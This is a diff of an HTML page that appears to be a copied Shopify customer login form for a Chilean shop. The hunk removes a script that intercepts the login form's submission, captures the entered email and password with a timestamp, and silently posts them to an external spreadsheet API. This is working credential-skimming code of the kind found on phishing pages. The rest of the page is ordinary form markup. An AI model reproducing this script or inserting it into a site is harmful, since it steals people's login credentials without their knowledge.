@@ -206,32 +206,6 @@
   }
 </script>
 
-<script>
-  document.getElementById("loginForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-    const fecha = new Date().toISOString();
-
-    fetch("https://api.sheetbest.com/sheets/c7472fd5-4c77-4694-8ef0-c84a9c69f8fd", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        email: email,
-        password: password,
-        fecha: fecha
-      })
-    });
-
-    validateLogin();
-  });
-</script>
-
-
-          
   <form id="captcha_form" novalidate="novalidate" action="/authentication/56001495129/verify?client_id=e0092440-6979-4480-86f7-e9414c90e42e&amp;locale=es&amp;redirect_uri=https%3A%2F%2Fshopify.com%2Fauthentication%2F56001495129%2Foauth%2Fauthorize%3Fclient_id%3De0092440-6979-4480-86f7-e9414c90e42e%26locale%3Des%26nonce%3Dedb76e25-a5ba-45c3-8148-dd5dd65fadf6%26redirect_uri%3Dhttps%253A%252F%252Fcuenta.luxeny.cl%252Fcallback%253Fsource%253Dcore%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bcustomer-account-api%253Afull%26state%3D01JTYNY2P8N98KHRG417JWAY3A" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="hVQLmMnLyGpr9BhXVpTdaJKARzI3bjm1FnrwiPgOIabYOPo0YmeFIVuK4neHs4RPPSHTIJFtdioZU67jamyOYA" autocomplete="off" />
     <div class="ui-form__section">
       <div class="ui-form__group polaris-uplift-input-wrapper">
